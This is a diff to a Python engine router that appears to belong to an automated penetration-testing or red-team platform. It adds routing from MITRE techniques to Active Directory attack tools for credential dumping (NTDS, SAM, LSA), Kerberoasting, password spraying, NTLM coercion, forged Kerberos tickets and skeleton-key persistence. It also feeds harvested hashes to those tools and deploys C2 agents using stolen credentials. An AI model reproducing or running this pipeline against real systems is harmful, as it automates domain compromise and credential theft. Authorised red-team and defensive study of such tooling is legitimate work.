@@ -56,11 +56,17 @@ def _is_auth_failure(error: str | None) -> bool:
 # Fallback only to engines of the same technical category:
 #   credential/access-based: mcp_ssh <-> c2  (both require existing access)
 #   exploit-based: metasploit  (standalone; no same-category fallback)
+# NOTE: SPEC-040 originally isolated metasploit with no fallback (standalone
+# exploit-based engine). This was relaxed to allow metasploit -> mcp_ssh
+# degradation so that when msfrpcd is down, credential-based SSH execution
+# can still proceed if valid credentials exist. This is a cross-category
+# fallback and should be documented in an ADR amendment.
 _FALLBACK_CHAIN: dict[str, list[str]] = {
     "mcp_ssh":    ["c2"],
-    "metasploit": [],
+    "metasploit": ["mcp_ssh"],   # Relaxed from SPEC-040: msf down -> try SSH
     "c2":         ["mcp_ssh"],
     "mcp_recon":  [],      # no fallback — recon either works or it doesn't
+    "mcp_ad":     [],      # AD MCP tools: no fallback (specialized tooling)
 }
 
 _RECON_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
@@ -109,6 +115,43 @@ def _is_valid_iam_role_name(name: str) -> bool:
     """Reject HTML, whitespace blobs, or other garbage before chaining IMDS step 2."""
     return bool(_IAM_ROLE_NAME_RE.match(name))
 
+
+# ---------------------------------------------------------------------------
+# AD MCP tool routing table (SPEC-060/061 integration)
+# Maps MITRE technique IDs to (mcp_server_name, mcp_tool_name) tuples.
+#
+# tech-debt: test-pending — need tests for _execute_via_ad_mcp(), AD routing
+#   table consistency with technique_rules.yaml, and C2 bootstrap param fix.
+#   Vibe-coding workflow exemption (ASP).
+#
+# NOTE: Some technique IDs (e.g. T1003.003) also have WinRM playbook entries
+# in technique_playbooks. The AD MCP route is checked BEFORE the generic
+# MCP/SSH path in _execute_single(), so AD MCP tools take priority. This is
+# intentional: the MCP credential-dumper provides remote NTDS extraction
+# (secretsdump-based) which is the actual attack, while the WinRM playbook
+# is a lightweight local SAM access check.
+# ---------------------------------------------------------------------------
+_AD_TECHNIQUE_TO_MCP: dict[str, tuple[str, str]] = {
+    "T1087.002": ("bloodhound-collector", "bloodhound_collect"),
+    "T1482":     ("bloodhound-collector", "bloodhound_enum_trusts"),
+    "T1110.003": ("netexec-suite", "netexec_password_spray"),
+    "T1558.003": ("credential-dumper", "kerberoast"),
+    "T1003.002": ("credential-dumper", "dump_sam_hashes"),
+    "T1003.003": ("credential-dumper", "dump_ntds"),
+    "T1003.004": ("credential-dumper", "dump_lsa_secrets"),
+    "T1557.001": ("responder-capture", "responder_start"),
+    "T1187":     ("coercion-tools", "coerce_petitpotam"),
+    "T1558.001": ("impacket-ad", "impacket_golden_ticket"),
+    "T1558.002": ("impacket-ad", "impacket_silver_ticket"),
+    "T1550.003": ("impacket-ad", "impacket_get_tgt"),
+    "T1222.001": ("ad-exploiter", "ad_acl_abuse"),
+    "T1484.001": ("ad-exploiter", "ad_gpo_abuse"),
+    "T1134.005": ("ad-exploiter", "ad_sid_history"),
+    "T1556.001": ("ad-persistence", "persist_skeleton_key"),
+    "T1547.005": ("ad-persistence", "persist_custom_ssp"),
+    "T1110.002": ("hashcat-crack", "hashcat_crack_ntlm"),
+    "T1649":     ("certipy-ad", "certipy_find"),
+}
 
 _TERMINAL_ERRORS: list[str] = [
     "scope violation",
@@ -380,6 +423,13 @@ class EngineRouter:
         if tech_prefix in _INITIAL_ACCESS_TECHNIQUE_PREFIXES:
             return await self._execute_initial_access(
                 db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
+            )
+
+        # -- AD MCP route: technique in AD routing table --
+        if technique_id in _AD_TECHNIQUE_TO_MCP and settings.MCP_ENABLED and self._mcp_engine:
+            return await self._execute_via_ad_mcp(
+                db, exec_id, now, technique_id, target_id,
+                operation_id, ooda_iteration_id,
             )
 
         # -- MCP route: engine == "mcp" (explicit tool-registry dispatch) --
@@ -719,14 +769,27 @@ class EngineRouter:
                 and settings.C2_BOOTSTRAP_ENABLED
             ):
                 try:
-                    bootstrap_result = await ia_engine.bootstrap_c2_agent(
-                        db=db,
-                        operation_id=operation_id,
-                        target_id=target_id,
-                        credential=credential,
+                    # Resolve parameters for bootstrap_c2_agent(ip, credential, c2_host)
+                    target_ip = target_row["ip_address"] or ""
+                    # credential from IA result is "user:pass" string — split into tuple
+                    if isinstance(credential, str) and ":" in credential:
+                        cred_parts = credential.split(":", 1)
+                        cred_tuple = (cred_parts[0], cred_parts[1])
+                    elif isinstance(credential, (tuple, list)) and len(credential) >= 2:
+                        cred_tuple = (credential[0], credential[1])
+                    else:
+                        cred_tuple = (str(credential), "")
+                    c2_host = (
+                        settings.C2_AGENT_CALLBACK_URL
+                        or settings.C2_ENGINE_URL
                     )
-                    if bootstrap_result and bootstrap_result.get("success"):
-                        summary += f" | C2 agent deployed (paw: {bootstrap_result.get('paw', 'unknown')})"
+                    bootstrap_result = await ia_engine.bootstrap_c2_agent(
+                        ip=target_ip,
+                        credential=cred_tuple,
+                        c2_host=c2_host,
+                    )
+                    if bootstrap_result:
+                        summary += " | C2 agent deployed"
                         logger.info(
                             "SPEC-052: C2 agent bootstrapped in Act phase for %s",
                             target_id,
@@ -870,6 +933,85 @@ class EngineRouter:
                 PersistenceEngine().probe(get_pool, operation_id, target_id, cred_row["value"])
             )
         return final
+
+    async def _execute_via_ad_mcp(
+        self,
+        db: asyncpg.Connection,
+        exec_id: str,
+        now: "datetime",
+        technique_id: str,
+        target_id: str,
+        operation_id: str,
+        ooda_iteration_id: str | None,
+    ) -> dict:
+        """Route AD techniques to their designated MCP server+tool (SPEC-060/061)."""
+        mcp_server, mcp_tool = _AD_TECHNIQUE_TO_MCP[technique_id]
+        qualified_name = f"{mcp_server}:{mcp_tool}"
+
+        # Create execution record
+        await db.execute(
+            "INSERT INTO technique_executions "
+            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
+            "engine, status, started_at) "
+            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
+            exec_id, technique_id, target_id, operation_id,
+            ooda_iteration_id, "mcp_ad", now,
+        )
+
+        await self._ws.broadcast(operation_id, "execution.update", {
+            "id": exec_id, "technique_id": technique_id,
+            "status": "running", "engine": "mcp_ad",
+        })
+
+        target_ip = await self._get_target_ip(db, target_id)
+        target_str = target_ip or target_id
+
+        # Collect credential context for AD tools that need it
+        cred_row = await db.fetchrow(
+            "SELECT trait, value FROM facts "
+            "WHERE operation_id = $1 AND source_target_id = $2 "
+            "AND trait IN ('credential.ssh', 'credential.domain_user', "
+            "'credential.domain_admin', 'credential.ntlm_hash', "
+            "'credential.ntds_hash', 'credential.service_hash', "
+            "'credential.krbtgt_hash') "
+            "AND trait NOT LIKE '%%.invalidated' "
+            "ORDER BY collected_at DESC LIMIT 1",
+            operation_id, target_id,
+        )
+
+        params: dict = {"technique_id": technique_id}
+        if cred_row:
+            params["credential"] = cred_row["value"]
+
+        try:
+            result: ExecutionResult = await self._mcp_engine.execute(
+                qualified_name, target_str, params=params,
+            )
+
+            final = await self._finalize_execution(
+                db, exec_id, technique_id, target_id, "mcp_ad",
+                operation_id, result,
+            )
+            return final
+
+        except Exception as e:
+            logger.exception(
+                "AD MCP execution failed: technique=%s tool=%s",
+                technique_id, qualified_name,
+            )
+            failure_category = _classify_failure(str(e), "mcp_ad")
+            await db.execute(
+                "UPDATE technique_executions SET status = 'failed', "
+                "error_message = $1, failure_category = $2, completed_at = $3 "
+                "WHERE id = $4",
+                str(e)[:500], failure_category,
+                datetime.now(timezone.utc), exec_id,
+            )
+            return {
+                "execution_id": exec_id, "technique_id": technique_id,
+                "target_id": target_id, "engine": "mcp_ad",
+                "status": "failed", "error": str(e),
+            }
 
     async def _get_output_parser(
         self, db: asyncpg.Connection, technique_id: str, platform: str = "linux"
@@ -1445,6 +1587,26 @@ class EngineRouter:
     ) -> dict:
         """Execute technique via MetasploitRPCEngine (ADR-019)."""
         from app.clients.metasploit_client import MetasploitRPCEngine  # noqa: PLC0415
+
+        # Pre-execution relay health check (P2: relay monitoring)
+        try:
+            from app.services.relay_monitor import RelayMonitor  # noqa: PLC0415
+            relay_status = await RelayMonitor().pre_execute_check(target_ip)
+            if relay_status and not relay_status.connected:
+                logger.warning(
+                    "Relay '%s' (%s) is disconnected before Metasploit execution "
+                    "for %s — exploit may fail if reverse-shell payload is used",
+                    relay_status.name, relay_status.ip, target_ip,
+                )
+                await self._ws.broadcast(operation_id, "relay.warning", {
+                    "technique_id": technique_id,
+                    "target_ip": target_ip,
+                    "relay_name": relay_status.name,
+                    "relay_ip": relay_status.ip,
+                    "error": relay_status.error,
+                })
+        except Exception:
+            pass  # relay check is best-effort
 
         started_at = datetime.now(timezone.utc)
         await db.execute(
